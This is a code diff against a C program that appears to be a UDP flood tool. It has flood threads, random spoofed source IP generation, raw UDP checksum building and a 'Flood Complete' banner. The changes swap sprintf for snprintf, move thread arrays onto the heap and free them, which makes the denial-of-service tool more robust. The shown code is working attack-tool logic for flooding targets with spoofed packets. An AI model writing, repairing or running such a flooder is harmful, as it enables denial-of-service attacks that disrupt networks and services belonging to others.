@@ -87,7 +87,7 @@ int random_int(int min, int max) {
 }
 
 void random_ip(char *ip_str) {
-    sprintf(ip_str, "%d.%d.%d.%d",
+    snprintf(ip_str, 16, "%d.%d.%d.%d",
             random_int(1, 255), random_int(0, 255),
             random_int(0, 255), random_int(1, 255));
 }
@@ -192,7 +192,7 @@ void *flood_thread(void *arg) {
             int csum_len = sizeof(struct pseudo_hdr) + sizeof(struct udphdr) + payload_size;
             char *checksum_buf = malloc(csum_len);
             if (checksum_buf) {
-                memset(checksum_buf, 0, csum_len);
+                memset(checksum_buf, 0, (size_t)csum_len);
                 memcpy(checksum_buf, &psh, sizeof(struct pseudo_hdr));
                 memcpy(checksum_buf + sizeof(struct pseudo_hdr), udph, sizeof(struct udphdr) + payload_size);
                 udph->check = checksum((unsigned short *)checksum_buf, csum_len);
@@ -268,8 +268,16 @@ void run_flood(const char *ip, int port, int duration, int threads,
         spoof = false;
     }
 
-    pthread_t thread_ids[threads];
-    thread_data_t data[threads];
+    /* Dynamically allocate thread arrays */
+    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
+    thread_data_t *data = malloc(threads * sizeof(thread_data_t));
+    
+    if (!thread_ids || !data) {
+        fprintf(stderr, "[!] Memory allocation failed\n");
+        free(thread_ids);
+        free(data);
+        return;
+    }
 
     for (int i = 0; i < threads; i++) {
         memset(&data[i], 0, sizeof(thread_data_t));
@@ -312,6 +320,9 @@ void run_flood(const char *ip, int port, int duration, int threads,
     printf("\n\n╔══════════════════════════════════════════════════╗\n");
     printf("║           Flood Complete                        ║\n");
     printf("╚══════════════════════════════════════════════════╝\n");
+    
+    free(thread_ids);
+    free(data);
 }
 
 /* ================================================================
